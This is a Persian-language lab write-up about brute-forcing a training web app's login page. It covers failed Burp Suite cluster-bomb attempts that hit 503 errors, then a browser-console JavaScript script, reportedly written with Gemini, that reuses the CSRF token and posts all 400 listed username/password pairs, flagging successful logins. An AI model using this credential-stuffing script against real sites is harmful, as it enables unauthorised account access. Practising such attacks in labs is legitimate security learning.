در این lab یک صفحه login داریم و 20 تا پسورد و 20 تا یوزرنیم که باید با روش brute force و dictionary attack داخل burp suite به وب اپ حمله کنیم. روش cluster bomb رو انتخاب کردم که کل 400 حالت رو درنظر بگیره و چک کنه. که نمیدونم چرا هرکاری هم کردم بازم یه مرحله ای میرسه که status = 503 میگیرم. intercept رو حین حمله off کردم، حتی resource pool جدید هم ساختم ولی همچنان همونه. دوباره بهش برمیگردم و بالاخره حلش میکنم. باید بفهمم مشکل از کجاست دقیقا! چیزی که تو ذهنمه اینه که سرور فکر میکنه حمله DoS بهش شده و احتمالا جواب نمیده و همش 503 میفرسته. ولی مساله اینجاست که چرا با resource pool جدید همچنان همین مشکل رو دارم؟ شاید توی set کردنش اشتباه کردم و اصلا درست set نشده. فعلا نمیدونم.


خب من تسلیم شدم بعد از مدت ها و با یه کد ساده ساخت جمنای داخل consule انجامش دادم :))))))))


‍‍```js
const usernames = ["dvegafisheredward", "raymond68", "bethbarrett", "triciafloyd", "dschultz", "ambercarter", "shawnaperez", "pwolfe", "patrick40", "smithjacqueline", "philipwhite", "eileengibson", "elizabeth53", "davidburke", "galvanalexandra", "sharon18", "ukemp", "smiller", "nicolechandler", "franciscoanderson"];
const passwords = ["|L1$z6d{<QbY", "9vC3qF#bZgRm", "tF:06LpL^ndV", "q%ZdV!Bt8PKu", "xMb4*s<6EWr5", "Z!HjQ9>oA7aM", "P$J6nxFD=VhL", "7cM|%5mUjW9r", "2aX^Pf3W#b6u", "Zk@7aVm:9Q$D", "4vFjW#C7xP2k", "H9m^XvV|8nR2", "a4TzE6|y&Nw7", "3W<z^Fm7@bLp", "F3A+gY9zLx%7", "X8Pw|0ZfA4*Y", "R9c#Lh:5Qp2U", "V2zP!w#k6Lr4", "t%YvB1oL^6gQ", "W7X^Fb>9yJ3q"];


const tokenElement = document.querySelector('[name=csrfmiddlewaretoken]');
const csrfToken = tokenElement ? tokenElement.value : null;

if (!csrfToken) {
    console.log("خطا: توکن امنیتی پیدا نشد! مطمئن شو که در صفحه لاگین هستی.");
} else {
    console.log("توکن با موفقیت پیدا شد، شروع حمله...");

    usernames.forEach(user => {
        passwords.forEach(pass => {
            const formdata = new FormData();
            formdata.set('csrfmiddlewaretoken', csrfToken);
            formdata.set('username', user);
            formdata.set('password', pass);

            fetch(window.location.href, {
                method: 'POST',
                body: formdata
            })
            .then(async res => {
                const responseText = await res.text();
        
                if (!responseText.includes('نام کاربری یا رمز عبور نامعتبر است.')) {
                    console.log("%c********************************", "color: yellow; font-weight: bold;");
                    console.log(`%c[+] پیدا شد! یوزرنیم: ${user} | پسورد: ${pass}`, "color: lime; font-size: 15px; font-weight: bold;");
                    console.log("%c********************************", "color: yellow; font-weight: bold;");
                }
            })
            .catch(err => console.log("خطا در شبکه:", err));
        });
    });
}
```
